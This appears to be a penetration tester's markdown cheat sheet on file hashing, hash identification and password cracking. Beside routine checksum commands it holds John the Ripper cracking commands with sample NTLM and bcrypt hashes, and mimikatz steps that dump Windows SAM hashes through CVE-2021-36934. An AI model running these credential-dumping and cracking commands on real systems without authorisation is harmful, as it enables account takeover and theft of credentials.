
# Random File
* 
```bash
# 8MB random file
 dd if=/dev/urandom of=randomfile bs=4M count=2
```

# Hashing and Digests
# --check, -c to check the files

```bash
md5sum path/to/file1 path/to/file2 ... > path/to/file.md5
md5sum --check path/to/file.md5 
# same syntax
sha1sum
sha256sum
sha512sum
```

```powershell
certutil -hashfile path/to/file1 md5
# same syntax
certutil -hashfile path/to/file1 sha1
certutil -hashfile path/to/file1 sha256
certutil -hashfile path/to/file1 sha512
```

# Find File by Hash (recursive)

```bash
find /etc -type f -exec sha256sum {} \; | grep "sha256-hash"
```



# Password Has Identification
* hashid https://psypanda.github.io/hashID/
* hash-identifier https://psypanda.github.io/hashID/


# Password Hash Cracking
* Online Password Crackstation https://crackstation.net/
* Kali use john (the ripper)

```bash
# Prepare
cp /usr/share/wordlists/rockyou.txt.gz .; gunzip rockyou.txt.gz
# Windows
echo -n 'User:1001:aad3b435b51404eeaad3b435b51404ee:4056DA565EFF865C23687B2D1CEF8242:::' > ntlm.hash
john --wordlist=rockyou.txt --format=NT ntlm.hash 
john --show ntlm.hash 
# Linux
echo -n 'linux:$2y$10$oHnLh4lejEKMTqo7vARr7O56/O1DgT3kscywsmF5zKtkSxlgAJ2v2' > linux.hash
john --wordlist=rockyou.txt linux.hash
# Hash
echo -n '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' > sha1.hash
john --wordlist=rockyou.txt --format=raw-sha1 sha1.hash
john --show sha1.hash


```

# Windows Password Hash
* Windows Security Account Manager `uid:rid:lm hash:ntlm hash`

```powershell
# Windows SAM file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM and SYSTEM privileges are required to view it.
# LM hash "aa...ee" is an empty string 
# NTLM hash is "88..6D" is salted hash
# https://specopssoft.com/de/blog/microsoft_wechselt_von_ntlm_auf_kerberos/
User:1001:aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586D:::
```

# Dump NTLM Hash on Windows 10 (20H2)
* https://www.bleepingcomputer.com/news/microsoft/new-windows-10-vulnerability-allows-anyone-to-get-admin-privileges/
* CVE-2021-36934

Windows Host vulnerable?

```powershell
icacls %SystemRoot%/system32/config/SAM
[!] BUILTIN\Users:(I)(RX)
```

Use mimikatz to dump NTLM from Volume Shadow Copy (VSS)

```powershell
# extract
mimikatz
lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM 
lsadump::sam /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

# Linux Password Hash
* Linux Shadow File entry with optional param`$id$param$salt$hash` 

```bash
# Linux /etc/shadow
$2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi
$y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7
```

```bash
# Linux Shadow file identifier
$1$: MD5-based crypt ('md5crypt')
$2$: Blowfish-based crypt ('bcrypt')
$2y$: Eksblowfish
$sha1$: SHA-1-based crypt ('sha1crypt')
$5$: SHA-256-based crypt ('sha256crypt')
$6$: SHA-512-based crypt ('sha512crypt')
$y$: yescrypt
$gy$: ghost yesscrypt 
```

## Make Linux Password

```bash
mkpasswd -m help
mkpasswd -m bcrypt -R 10 "PASSWORD"
mkpasswd -m sha512crypt -S "SALT" "PASSWORD" 
```

